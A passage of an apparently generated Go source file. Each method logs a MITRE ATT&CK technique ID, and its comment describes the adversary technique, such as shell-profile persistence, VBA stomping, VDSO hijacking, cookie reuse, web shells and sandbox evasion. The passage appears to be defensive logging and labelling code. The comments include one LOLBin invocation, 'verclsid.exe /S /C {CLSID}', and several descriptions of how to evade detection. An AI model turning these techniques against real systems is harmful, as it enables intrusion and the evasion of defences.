Adversaries may take advantage of trusted developer utilities to proxy execution
of malicious payloads. There are many utilities used for software development
related tasks that can be used to execute code in various forms to assist in
development, debugging, and reverse engineering.(Citation: engima0x3 DNX
Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday
WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with
legitimate certificates that allow them to execute on a system and proxy
execution of malicious code through a trusted process that effectively bypasses
application control solutions.
*/
func (g *Session) ATTACKEntTrustedDeveloperUtilitiesProxyExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1127").
        Msg("trusted developer utilities proxy execution")
}

/* ATTACKEntTrustedRelationship Phases: initial-access

Adversaries may breach or otherwise leverage organizations who have access to
intended victims. Access through trusted third party relationship exploits an
existing connection that may not be protected or receives less scrutiny than
standard mechanisms of gaining access to a network. Organizations often grant
elevated access to second or third-party external providers in order to allow
them to manage internal systems as well as cloud-based environments. Some
examples of these relationships include IT services contractors, managed
security providers, infrastructure contractors (e.g. HVAC, elevators, physical
security). The third-party provider's access may be intended to be limited to
the infrastructure being maintained, but may exist on the same network as the
rest of the enterprise. As such, Valid Accounts used by the other party for
access to internal network systems may be compromised and used.(Citation: CISA
IT Service Providers)
*/
func (g *Session) ATTACKEntTrustedRelationship(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1199").
        Msg("trusted relationship")
}

/* ATTACKEntTwoFactorAuthenticationInterception Phases: credential-access

Adversaries may target two-factor authentication mechanisms, such as smart
cards, to gain access to credentials that can be used to access systems,
services, and network resources. Use of two or multi-factor authentication (2FA
or MFA) is recommended and provides a higher level of security than user names
and passwords alone, but organizations should be aware of techniques that could
be used to intercept and bypass these security mechanisms.  If a smart card is
used for two-factor authentication, then a keylogger will need to be used to
obtain the password associated with a smart card during normal use. With both an
inserted card and access to the smart card password, an adversary can connect to
a network resource using the infected system to proxy the authentication with
the inserted hardware token. (Citation: Mandiant M Trends 2011) Adversaries may
also employ a keylogger to similarly target other hardware tokens, such as RSA
SecurID. Capturing token input (including a user's personal identification code)
may provide temporary access (i.e. replay the one-time passcode until the next
value rollover) as well as possibly enabling adversaries to reliably predict
future authentication values (given access to both the algorithm and any seed
values used to generate appended temporary codes). (Citation: GCN RSA June 2011)
Other methods of 2FA may be intercepted and used by an adversary to
authenticate. It is common for one-time codes to be sent via out-of-band
communications (email, SMS). If the device and/or service is not secured, then
it may be vulnerable to interception. Although primarily focused on by cyber
criminals, these authentication mechanisms have been targeted by advanced
actors. (Citation: Operation Emmental)
*/
func (g *Session) ATTACKEntTwoFactorAuthenticationInterception(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1111").
        Msg("two-factor authentication interception")
}

/* ATTACKEntUnixShell Phases: execution

Adversaries may abuse Unix shell commands and scripts for execution. Unix shells
are the primary command prompt on Linux and macOS systems, though many
variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the
specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix
shells can control every aspect of a system, with certain commands requiring
elevated privileges. Unix shells also support scripts that enable sequential
execution of commands as well as other typical programming operations such as
conditionals and loops. Common uses of shell scripts include long or repetitive
tasks, or the need to run the same set of commands on multiple systems.
Adversaries may abuse Unix shells to execute various commands or payloads.
Interactive shells may be accessed through command and control channels or
during lateral movement such as with SSH. Adversaries may also leverage shell
scripts to deliver and execute multiple commands on victims or as part of
payloads used for persistence.
*/
func (g *Session) ATTACKEntUnixShell(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059.004").
        Msg("unix shell")
}

/* ATTACKEntUnixShellConfigurationModification Phases: privilege-escalation persistence

Adversaries may establish persistence through executing malicious commands
triggered by a user’s shell. User Unix Shells execute several configuration
scripts at different points throughout the session based on events. For example,
when a user opens a command-line interface or remotely logs in (such as via SSH)
a login shell is initiated. The login shell executes scripts from the system
(/etc) and the user’s home directory (~/) to configure the environment. All
login shells on a system use /etc/profile when initiated. These configuration
scripts run at the permission level of their directory and are often used to set
environment variables, create aliases, and customize the user’s environment.
When the shell exits or terminates, additional shell scripts are executed to
ensure the shell exits appropriately.  Adversaries may attempt to establish
persistence by inserting commands into scripts automatically executed by shells.
Using bash as an example, the default shell for most GNU/Linux systems,
adversaries may add commands that launch malicious binaries into the
/etc/profile and /etc/profile.d files.(Citation: intezer-kaiji-
malware)(Citation: bencane blog bashrc) These files typically require root
permissions to modify and are executed each time any shell on a system launches.
For user level permissions, adversaries can insert malicious commands into
~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user
opens a command-line interface or connects remotely.(Citation: anomali-rocke-
tactics)(Citation: Linux manual bash invocation) Since the system only executes
the first existing file in the listed order, adversaries have used
~/.bash_profile to ensure execution. Adversaries have also leveraged the
~/.bashrc file which is additionally executed if the connection is established
remotely or an additional interactive shell is opened, such as a new tab in the
command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-
tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets
the termination of a program to trigger execution, adversaries can use the
~/.bash_logout file to execute malicious commands at the end of a session.  For
macOS, the functionality of this technique is similar but may leverage zsh, the
default shell for macOS 10.15+. When the Terminal.app is opened, the application
launches a zsh login shell and a zsh interactive shell. The login shell
configures the system environment using /etc/profile, /etc/zshenv,
/etc/zprofile, and /etc/zlogin.(Citation: ScriptingOSX zsh)(Citation:
PersistentJXA_leopitt)(Citation: code_persistence_zsh) The login shell then
configures the user environment with ~/.zprofile and ~/.zlogin. The interactive
shell uses the ~/.zshrc to configure the user environment. Upon exiting,
/etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes
/etc/bashrc on startup.
*/
func (g *Session) ATTACKEntUnixShellConfigurationModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.004").
        Msg("unix shell configuration modification")
}

/* ATTACKEntUnsecuredCredentials Phases: credential-access

Adversaries may search compromised systems to find and obtain insecurely stored
credentials. These credentials can be stored and/or misplaced in many locations
on a system, including plaintext files (e.g. Bash History), operating system or
application-specific repositories (e.g. Credentials in Registry), or other
specialized files/artifacts (e.g. Private Keys).
*/
func (g *Session) ATTACKEntUnsecuredCredentials(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1552").
        Msg("unsecured credentials")
}

/* ATTACKEntUnusedUnsupportedCloudRegions Phases: defense-evasion

Adversaries may create cloud instances in unused geographic service regions in
order to evade detection. Access is usually obtained through compromising
accounts used to manage cloud infrastructure. Cloud service providers often
provide infrastructure throughout the world in order to improve performance,
provide redundancy, and allow customers to meet compliance requirements.
Oftentimes, a customer will only use a subset of the available regions and may
not actively monitor other regions. If an adversary creates resources in an
unused region, they may be able to operate undetected. A variation on this
behavior takes advantage of differences in functionality across cloud regions.
An adversary could utilize regions which do not support advanced detection
services in order to avoid detection of their activity. An example of adversary
use of unused AWS regions is to mine cryptocurrency through Resource Hijacking,
which can cost organizations substantial amounts of money over time depending on
the processing power used.(Citation: CloudSploit - Unused AWS Regions)
*/
func (g *Session) ATTACKEntUnusedUnsupportedCloudRegions(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1535").
        Msg("unused/unsupported cloud regions")
}

/* ATTACKEntUploadMalware Phases: resource-development

Adversaries may upload malware to third-party or adversary controlled
infrastructure to make it accessible during targeting. Malicious software can
include payloads, droppers, post-compromise tools, backdoors, and a variety of
other malicious content. Adversaries may upload malware to support their
operations, such as making a payload available to a victim network to enable
Ingress Tool Transfer by placing it on an Internet accessible web server.
Malware may be placed on infrastructure that was previously purchased/rented by
the adversary (Acquire Infrastructure) or was otherwise compromised by them
(Compromise Infrastructure). Malware can also be staged on web services, such as
GitHub or Pastebin.(Citation: Volexity Ocean Lotus November 2020) Adversaries
may upload backdoored files, such as application binaries, virtual machine
images, or container images, to third-party software stores or repositories (ex:
GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may
directly download/install these backdoored files via User Execution.
Masquerading may increase the chance of users mistakenly executing these files.
*/
func (g *Session) ATTACKEntUploadMalware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1608.001").
        Msg("upload malware")
}

/* ATTACKEntUploadTool Phases: resource-development

Adversaries may upload tools to third-party or adversary controlled
infrastructure to make it accessible during targeting. Tools can be open or
closed source, free or commercial. Tools can be used for malicious purposes by
an adversary, but (unlike malware) were not intended to be used for those
purposes (ex: PsExec). Adversaries may upload tools to support their operations,
such as making a tool available to a victim network to enable Ingress Tool
Transfer by placing it on an Internet accessible web server. Tools may be placed
on infrastructure that was previously purchased/rented by the adversary (Acquire
Infrastructure) or was otherwise compromised by them (Compromise
Infrastructure).(Citation: Dell TG-3390) Tools can also be staged on web
services, such as an adversary controlled GitHub repo. Adversaries can avoid the
need to upload a tool by having compromised victim machines download the tool
directly from a third-party hosting location (ex: a non-adversary controlled
GitHub repo), including the original hosting site of the tool.
*/
func (g *Session) ATTACKEntUploadTool(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1608.002").
        Msg("upload tool")
}

/* ATTACKEntUseAlternateAuthenticationMaterial Phases: defense-evasion lateral-movement

Adversaries may use alternate authentication material, such as password hashes,
Kerberos tickets, and application access tokens, in order to move laterally
within an environment and bypass normal system access controls.  Authentication
processes generally require a valid identity (e.g., username) along with one or
more authentication factors (e.g., password, pin, physical smart card, token
generator, etc.). Alternate authentication material is legitimately generated by
systems after a user or application successfully authenticates by providing a
valid identity and the required authentication factor(s). Alternate
authentication material may also be generated during the identity creation
process.(Citation: NIST Authentication)(Citation: NIST MFA) Caching alternate
authentication material allows the system to verify an identity has successfully
authenticated without asking the user to reenter authentication factor(s).
Because the alternate authentication must be maintained by the system—either in
memory or on disk—it may be at risk of being stolen through Credential Access
techniques. By stealing alternate authentication material, adversaries are able
to bypass system access controls and authenticate to systems without knowing the
plaintext password or any additional authentication factors.
*/
func (g *Session) ATTACKEntUseAlternateAuthenticationMaterial(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1550").
        Msg("use alternate authentication material")
}

/* ATTACKEntUserActivityBasedChecks Phases: defense-evasion discovery

Adversaries may employ various user activity checks to detect and avoid
virtualization and analysis environments. This may include changing behaviors
based on the results of checks for the presence of artifacts indicative of a
virtual machine environment (VME) or sandbox. If the adversary detects a VME,
they may alter their malware to disengage from the victim or conceal the core
functions of the implant. They may also search for VME artifacts before dropping
secondary or additional payloads. Adversaries may use the information learned
from Virtualization/Sandbox Evasion during automated discovery to shape follow-
on behaviors.  Adversaries may search for user activity on the host based on
variables such as the speed/frequency of mouse movements and clicks (Citation:
Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files
in common directories such as home or the desktop. Other methods may rely on
specific user interaction with the system before the malicious code is
activated, such as waiting for a document to close before activating a macro
(Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an
embedded image to activate.(Citation: FireEye FIN7 April 2017)
*/
func (g *Session) ATTACKEntUserActivityBasedChecks(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1497.002").
        Msg("user activity based checks")
}

/* ATTACKEntUserExecution Phases: execution

An adversary may rely upon specific actions by a user in order to gain
execution. Users may be subjected to social engineering to get them to execute
malicious code by, for example, opening a malicious document file or link. These
user actions will typically be observed as follow-on behavior from forms of
Phishing. While User Execution frequently occurs shortly after Initial Access it
may occur at other phases of an intrusion, such as when an adversary places a
file in a shared directory or on a user's desktop hoping that a user will click
on it. This activity may also be seen shortly after Internal Spearphishing.
*/
func (g *Session) ATTACKEntUserExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1204").
        Msg("user execution")
}

/* ATTACKEntVBAStomping Phases: defense-evasion

Adversaries may hide malicious Visual Basic for Applications (VBA) payloads
embedded within MS Office documents by replacing the VBA source code with benign
data.(Citation: FireEye VBA stomp Feb 2020) MS Office documents with embedded
VBA content store source code inside of module streams. Each module stream has a
PerformanceCache that stores a separate compiled version of the VBA source code
known as p-code. The p-code is executed when the MS Office version specified in
the _VBA_PROJECT stream (which contains the version-dependent description of the
VBA project) matches the version of the host MS Office application.(Citation:
Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream) An adversary may
hide malicious VBA code by overwriting the VBA source code location with zero’s,
benign code, or random bytes while leaving the previously compiled malicious
p-code. Tools that scan for malicious VBA source code may be bypassed as the
unwanted code is hidden in the compiled p-code. If the VBA source code is
removed, some tools might even think that there are no macros present. If there
is a version match between the _VBA_PROJECT stream and host MS Office
application, the p-code will be executed, otherwise the benign VBA source code
will be decompressed and recompiled to p-code, thus removing malicious p-code
and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct
2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)
*/
func (g *Session) ATTACKEntVBAStomping(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1564.007").
        Msg("vba stomping")
}

/* ATTACKEntVDSOHijacking Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into processes via VDSO hijacking in order
to evade process-based defenses as well as possibly elevate privileges. Virtual
dynamic shared object (vdso) hijacking is a method of executing arbitrary code
in the address space of a separate live process.  VDSO hijacking involves
redirecting calls to dynamically linked shared libraries. Memory protections may
prevent writing executable code to a process via Ptrace System Calls. However,
an adversary may hijack the syscall interface code stubs mapped into a process
from the vdso shared object to execute syscalls to open and map a malicious
shared object. This code can then be invoked by redirecting the execution flow
of the process via patched memory address references stored in a process' global
offset table (which store absolute addresses of mapped library
functions).(Citation: ELF Injection May 2009) (Citation: Backtrace VDSO)
(Citation: VDSO Aug 2005) (Citation: Syscall 2014) Running code in the context
of another process may allow access to the process's memory, system/network
resources, and possibly elevated privileges. Execution via VDSO hijacking may
also evade detection from security products since the execution is masked under
a legitimate process.
*/
func (g *Session) ATTACKEntVDSOHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.014").
        Msg("vdso hijacking")
}

/* ATTACKEntVNC Phases: lateral-movement

Adversaries may use Valid Accounts to remotely control machines using Virtual
Network Computing (VNC). The adversary may then perform actions as the logged-on
user. VNC is a desktop sharing system that allows users to remotely control
another computer’s display by relaying mouse and keyboard inputs over the
network. VNC does not necessarily use standard user credentials. Instead, a VNC
client and server may be configured with sets of credentials that are used only
for VNC connections.
*/
func (g *Session) ATTACKEntVNC(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1021.005").
        Msg("vnc")
}

/* ATTACKEntValidAccounts Phases: defense-evasion persistence privilege-escalation initial-access

Adversaries may obtain and abuse credentials of existing accounts as a means of
gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.
Compromised credentials may be used to bypass access controls placed on various
resources on systems within the network and may even be used for persistent
access to remote systems and externally available services, such as VPNs,
Outlook Web Access and remote desktop. Compromised credentials may also grant an
adversary increased privilege to specific systems or access to restricted areas
of the network. Adversaries may choose not to use malware or tools in
conjunction with the legitimate access those credentials provide to make it
harder to detect their presence. The overlap of permissions for local, domain,
and cloud accounts across a network of systems is of concern because the
adversary may be able to pivot across accounts and systems to reach a high level
of access (i.e., domain or enterprise administrator) to bypass access controls
set within the enterprise. (Citation: TechNet Credential Theft)
*/
func (g *Session) ATTACKEntValidAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1078").
        Msg("valid accounts")
}

/* ATTACKEntVerclsid Phases: defense-evasion

Adversaries may abuse verclsid.exe to proxy execution of malicious code.
Verclsid.exe is known as the Extension CLSID Verification Host and is
responsible for verifying each shell extension before they are used by Windows
Explorer or the Windows Shell.(Citation: WinOSBite verclsid.exe) Adversaries may
abuse verclsid.exe to execute malicious payloads. This may be achieved by
running verclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID
(CLSID), a unique identification number used to identify COM objects. COM
payloads executed by verclsid.exe may be able to perform various malicious
actions, such as loading and executing COM scriptlets (SCT) from remote servers
(similar to Regsvr32). Since it is signed and native on Windows systems,
proxying execution via verclsid.exe may bypass application control solutions
that do not account for its potential abuse.(Citation: LOLBAS
Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing the COM
Registry)(Citation: Nick Tyrer GitHub)
*/
func (g *Session) ATTACKEntVerclsid(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1218.012").
        Msg("verclsid")
}

/* ATTACKEntVideoCapture Phases: collection

An adversary can leverage a computer's peripheral devices (e.g., integrated
cameras or webcams) or applications (e.g., video call services) to capture video
recordings for the purpose of gathering information. Images may also be captured
from devices or applications, potentially in specified intervals, in lieu of
video files. Malware or scripts may be used to interact with the devices through
an available API provided by the operating system or an application to capture
video or images. Video or image files may be written to disk and exfiltrated
later. This technique differs from Screen Capture due to use of specific devices
or applications for video recording rather than capturing the victim's screen.
In macOS, there are a few different malware samples that record the user's
webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)
*/
func (g *Session) ATTACKEntVideoCapture(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1125").
        Msg("video capture")
}

/* ATTACKEntVirtualPrivateServer Phases: resource-development

Adversaries may rent Virtual Private Servers (VPSs) that can be used during
targeting. There exist a variety of cloud service providers that will sell
virtual machines/containers as a service. By utilizing a VPS, adversaries can
make it difficult to physically tie back operations to them. The use of cloud
infrastructure can also make it easier for adversaries to rapidly provision,
modify, and shut down their infrastructure. Acquiring a VPS for use in later
stages of the adversary lifecycle, such as Command and Control, can allow
adversaries to benefit from the ubiquity and trust associated with higher
reputation cloud service providers. Adversaries may also acquire infrastructure
from VPS service providers that are known for renting VPSs with minimal
registration information, allowing for more anonymous acquisitions of
infrastructure.(Citation: TrendmicroHideoutsLease)
*/
func (g *Session) ATTACKEntVirtualPrivateServer(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1583.003").
        Msg("virtual private server")
}

/* ATTACKEntVirtualPrivateServer2 Phases: resource-development

Adversaries may compromise third-party Virtual Private Servers (VPSs) that can
be used during targeting. There exist a variety of cloud service providers that
will sell virtual machines/containers as a service. Adversaries may compromise
VPSs purchased by third-party entities. By compromising a VPS to use as
infrastructure, adversaries can make it difficult to physically tie back
operations to themselves.(Citation: NSA NCSC Turla OilRig) Compromising a VPS
for use in later stages of the adversary lifecycle, such as Command and Control,
can allow adversaries to benefit from the ubiquity and trust associated with
higher reputation cloud service providers as well as that added by the
compromised third-party.
*/
func (g *Session) ATTACKEntVirtualPrivateServer2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1584.003").
        Msg("virtual private server")
}

/* ATTACKEntVirtualizationSandboxEvasion Phases: defense-evasion discovery

Adversaries may employ various means to detect and avoid virtualization and
analysis environments. This may include changing behaviors based on the results
of checks for the presence of artifacts indicative of a virtual machine
environment (VME) or sandbox. If the adversary detects a VME, they may alter
their malware to disengage from the victim or conceal the core functions of the
implant. They may also search for VME artifacts before dropping secondary or
additional payloads. Adversaries may use the information learned from
Virtualization/Sandbox Evasion during automated discovery to shape follow-on
behaviors.  Adversaries may use several methods to accomplish
Virtualization/Sandbox Evasion such as checking for security monitoring tools
(e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with
analysis or virtualization. Adversaries may also check for legitimate user
activity to help determine if it is in an analysis environment. Additional
methods include use of sleep timers or loops within malware code to avoid
operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)
*/
func (g *Session) ATTACKEntVirtualizationSandboxEvasion(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1497").
        Msg("virtualization/sandbox evasion")
}

/* ATTACKEntVisualBasic Phases: execution

Adversaries may abuse Visual Basic (VB) for execution. VB is a programming
language created by Microsoft with interoperability with many Windows
technologies such as Component Object Model and the Native API through the
Windows API. Although tagged as legacy with no planned future evolutions, VB is
integrated and supported in the .NET Framework and cross-platform .NET
Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft) Derivative languages
based on VB have also been created, such as Visual Basic for Applications (VBA)
and VBScript. VBA is an event-driven programming language built into Microsoft
Office, as well as several third-party applications.(Citation: Microsoft
VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to
automate the execution of tasks and other functionality on the host. VBScript is
a default scripting language on Windows hosts and can also be used in place of
JavaScript on HTML Application (HTA) webpages served to Internet Explorer
(though most modern browsers do not come with VBScript support).(Citation:
Microsoft VBScript) Adversaries may use VB payloads to execute malicious
commands. Common malicious usage includes automating execution of behaviors with
VBScript or embedding VBA content into Spearphishing Attachment payloads.
*/
func (g *Session) ATTACKEntVisualBasic(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059.005").
        Msg("visual basic")
}

/* ATTACKEntVulnerabilities Phases: resource-development

Adversaries may acquire information about vulnerabilities that can be used
during targeting. A vulnerability is a weakness in computer hardware or software
that can, potentially, be exploited by an adversary to cause unintended or
unanticipated behavior to occur. Adversaries may find vulnerability information
by searching open databases or gaining access to closed vulnerability
databases.(Citation: National Vulnerability Database) An adversary may monitor
vulnerability disclosures/databases to understand the state of existing, as well
as newly discovered, vulnerabilities. There is usually a delay between when a
vulnerability is discovered and when it is made public. An adversary may target
the systems of those known to conduct vulnerability research (including
commercial vendors). Knowledge of a vulnerability may cause an adversary to
search for an existing exploit (i.e. Exploits) or to attempt to develop one
themselves (i.e. Exploits).
*/
func (g *Session) ATTACKEntVulnerabilities(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1588.006").
        Msg("vulnerabilities")
}

/* ATTACKEntVulnerabilityScanning Phases: reconnaissance

Adversaries may scan victims for vulnerabilities that can be used during
targeting. Vulnerability scans typically check if the configuration of a target
host/application (ex: software and version) potentially aligns with the target
of a specific exploit the adversary may seek to use. These scans may also
include more broad attempts to Gather Victim Host Information that can be used
to identify more commonly known, exploitable vulnerabilities. Vulnerability
scans typically harvest running software and version numbers via server banners,
listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning)
Information from these scans may reveal opportunities for other forms of
reconnaissance (ex: Search Open Websites/Domains or Search Open Technical
Databases), establishing operational resources (ex: Develop Capabilities or
Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing
Application).
*/
func (g *Session) ATTACKEntVulnerabilityScanning(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1595.002").
        Msg("vulnerability scanning")
}

/* ATTACKEntWHOIS Phases: reconnaissance

Adversaries may search public WHOIS data for information about victims that can
be used during targeting. WHOIS data is stored by regional Internet registries
(RIR) responsible for allocating and assigning Internet resources such as domain
names. Anyone can query WHOIS servers for information about a registered domain,
such as assigned IP blocks, contact information, and DNS nameservers.(Citation:
WHOIS) Adversaries may search WHOIS data to gather actionable information.
Threat actors can use online resources or command-line utilities to pillage
through WHOIS data for information about potential victims. Information from
these sources may reveal opportunities for other forms of reconnaissance (ex:
Active Scanning or Phishing for Information), establishing operational resources
(ex: Acquire Infrastructure or Compromise Infrastructure), and/or initial access
(ex: External Remote Services or Trusted Relationship).
*/
func (g *Session) ATTACKEntWHOIS(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1596.002").
        Msg("whois")
}

/* ATTACKEntWeakenEncryption Phases: defense-evasion

Adversaries may compromise a network device’s encryption capability in order to
bypass encryption that would otherwise protect data communications. (Citation:
Cisco Synful Knock Evolution) Encryption can be used to protect transmitted
network traffic to maintain its confidentiality (protect against unauthorized
disclosure) and integrity (protect against unauthorized changes). Encryption
ciphers are used to convert a plaintext message to ciphertext and can be
computationally intensive to decipher without the associated decryption key.
Typically, longer keys increase the cost of cryptanalysis, or decryption without
the key. Adversaries can compromise and manipulate devices that perform
encryption of network traffic. For example, through behaviors such as Modify
System Image, Reduce Key Space, and Disable Crypto Hardware, an adversary can
negatively effect and/or eliminate a device’s ability to securely encrypt
network traffic. This poses a greater risk of unauthorized disclosure and may
help facilitate data manipulation, Credential Access, or Collection efforts.
(Citation: Cisco Blog Legacy Device Attacks)
*/
func (g *Session) ATTACKEntWeakenEncryption(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1600").
        Msg("weaken encryption")
}

/* ATTACKEntWebCookies Phases: credential-access

Adversaries may forge web cookies that can be used to gain access to web
applications or Internet services. Web applications and services (hosted in
cloud SaaS environments or on-premise servers) often use session cookies to
authenticate and authorize user access. Adversaries may generate these cookies
in order to gain access to web resources. This differs from Steal Web Session
Cookie and other similar behaviors in that the cookies are new and forged by the
adversary, rather than stolen or intercepted from legitimate users. Most common
web applications have standardized and documented cookie values that can be
generated using provided tools or interfaces.(Citation: Pass The Cookie) The
generation of web cookies often requires secret values, such as passwords,
Private Keys, or other cryptographic seed values. Once forged, adversaries may
use these web cookies to access resources (Web Session Cookie), which may bypass
multi-factor and other authentication protection mechanisms.(Citation: Volexity
SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies
January 2019)
*/
func (g *Session) ATTACKEntWebCookies(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1606.001").
        Msg("web cookies")
}

/* ATTACKEntWebPortalCapture Phases: collection credential-access

Adversaries may install code on externally facing portals, such as a VPN login
page, to capture and transmit credentials of users who attempt to log into the
service. For example, a compromised login page may log provided user credentials
before logging the user in to the service. This variation on input capture may
be conducted post-compromise using legitimate administrative access as a backup
measure to maintain network access through External Remote Services and Valid
Accounts or as part of the initial compromise by exploitation of the externally
facing web service.(Citation: Volexity Virtual Private Keylogging)
*/
func (g *Session) ATTACKEntWebPortalCapture(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1056.003").
        Msg("web portal capture")
}

/* ATTACKEntWebProtocols Phases: command-and-control

Adversaries may communicate using application layer protocols associated with
web traffic to avoid detection/network filtering by blending in with existing
traffic. Commands to the remote system, and often the results of those commands,
will be embedded within the protocol traffic between the client and server.
Protocols such as HTTP and HTTPS that carry web traffic may be very common in
environments. HTTP/S packets have many fields and headers in which data can be
concealed. An adversary may abuse these protocols to communicate with systems
under their control within a victim network while also mimicking normal,
expected traffic.
*/
func (g *Session) ATTACKEntWebProtocols(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1071.001").
        Msg("web protocols")
}

/* ATTACKEntWebService Phases: command-and-control

Adversaries may use an existing, legitimate external Web service as a means for
relaying data to/from a compromised system. Popular websites and social media
acting as a mechanism for C2 may give a significant amount of cover due to the
likelihood that hosts within a network are already communicating with them prior
to a compromise. Using common services, such as those offered by Google or
Twitter, makes it easier for adversaries to hide in expected noise. Web service
providers commonly use SSL/TLS encryption, giving adversaries an added level of
protection. Use of Web services may also protect back-end C2 infrastructure from
discovery through malware binary analysis while also enabling operational
resiliency (since this infrastructure may be dynamically changed).
*/
func (g *Session) ATTACKEntWebService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1102").
        Msg("web service")
}

/* ATTACKEntWebServices Phases: resource-development

Adversaries may register for web services that can be used during targeting. A
variety of popular websites exist for adversaries to register for a web-based
service that can be abused during later stages of the adversary lifecycle, such
as during Command and Control (Web Service) or Exfiltration Over Web Service.
Using common services, such as those offered by Google or Twitter, makes it
easier for adversaries to hide in expected noise. By utilizing a web service,
adversaries can make it difficult to physically tie back operations to them.
*/
func (g *Session) ATTACKEntWebServices(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1583.006").
        Msg("web services")
}

/* ATTACKEntWebServices2 Phases: resource-development

Adversaries may compromise access to third-party web services that can be used
during targeting. A variety of popular websites exist for legitimate users to
register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc.
Adversaries may try to take ownership of a legitimate user's access to a web
service and use that web service as infrastructure in support of cyber
operations. Such web services can be abused during later stages of the adversary
lifecycle, such as during Command and Control (Web Service) or Exfiltration Over
Web Service.(Citation: Recorded Future Turla Infra 2020) Using common services,
such as those offered by Google or Twitter, makes it easier for adversaries to
hide in expected noise. By utilizing a web service, particularly when access is
stolen from legitimate users, adversaries can make it difficult to physically
tie back operations to them.
*/
func (g *Session) ATTACKEntWebServices2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1584.006").
        Msg("web services")
}

/* ATTACKEntWebSessionCookie Phases: defense-evasion lateral-movement

Adversaries can use stolen session cookies to authenticate to web applications
and services. This technique bypasses some multi-factor authentication protocols
since the session is already authenticated.(Citation: Pass The Cookie)
Authentication cookies are commonly used in web applications, including cloud-
based services, after a user has authenticated to the service so credentials are
not passed and re-authentication does not need to occur as frequently. Cookies
are often valid for an extended period of time, even if the web application is
not actively used. After the cookie is obtained through Steal Web Session Cookie
or Web Cookies, the adversary may then import the cookie into a browser they
control and is then able to use the site or application as the user for as long
as the session cookie is active. Once logged into the site, an adversary can
access sensitive information, read email, or perform actions that the victim
account has permissions to perform. There have been examples of malware
targeting session cookies to bypass multi-factor authentication
systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)
*/
func (g *Session) ATTACKEntWebSessionCookie(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1550.004").
        Msg("web session cookie")
}

/* ATTACKEntWebShell Phases: persistence

Adversaries may backdoor web servers with web shells to establish persistent
access to systems. A Web shell is a Web script that is placed on an openly
accessible Web server to allow an adversary to use the Web server as a gateway
into a network. A Web shell may provide a set of functions to execute or a
command-line interface on the system that hosts the Web server. In addition to a
server-side script, a Web shell may have a client interface program that is used
to talk to the Web server (ex: China Chopper Web shell client).(Citation: Lee
2013)
*/
func (g *Session) ATTACKEntWebShell(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1505.003").
        Msg("web shell")
}

/* ATTACKEntWindowsCommandShell Phases: execution

